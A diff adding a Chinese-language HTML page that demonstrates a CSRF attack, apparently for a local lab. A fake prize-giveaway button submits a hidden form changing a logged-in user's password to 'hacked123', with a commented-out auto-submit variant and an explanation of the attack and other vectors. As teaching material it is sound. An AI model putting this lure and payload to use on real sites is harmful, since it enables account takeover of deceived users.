@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>CSRF 攻击页面</title>
+</head>
+<body>
+    <h1>恭喜你中奖了！</h1>
+    <p>点击下方按钮领取 100 元红包！</p>
+    <button onclick="claimPrize()">立即领取</button>
+
+    <!-- 隐藏的 CSRF 表单：自动提交 -->
+    <form id="csrf_form"
+          action="http://localhost:8000/csrf_victim.php"
+          method="POST"
+          style="display:none;">
+        <input type="hidden" name="new_password" value="hacked123">
+    </form>
+
+    <script>
+        function claimPrize() {
+            // 提交 CSRF 表单
+            document.getElementById('csrf_form').submit();
+            alert('红包领取成功！请查收~');
+        }
+
+        // 页面加载后自动提交（更隐蔽）
+        // window.onload = function() {
+        //     document.getElementById('csrf_form').submit();
+        // };
+    </script>
+
+    <hr>
+    <h3>攻击原理：</h3>
+    <ol>
+        <li>用户已登录目标网站（cookie 有效）</li>
+        <li>用户访问了攻击者的这个页面</li>
+        <li>点击按钮后，浏览器自动携带目标网站的 cookie</li>
+        <li>向目标网站发送修改密码的 POST 请求</li>
+        <li>目标网站认为是用户的正常操作，修改了密码</li>
+    </ol>
+
+    <h3>其他 CSRF 攻击方式：</h3>
+    <ul>
+        <li>img 标签自动加载 GET 请求：<code>&lt;img src="http://target/delete?id=1"&gt;</code></li>
+        <li>iframe 自动提交表单</li>
+        <li>XMLHttpRequest 跨域请求（带 Cookie）</li>
+    </ul>
+</body>
+</html>
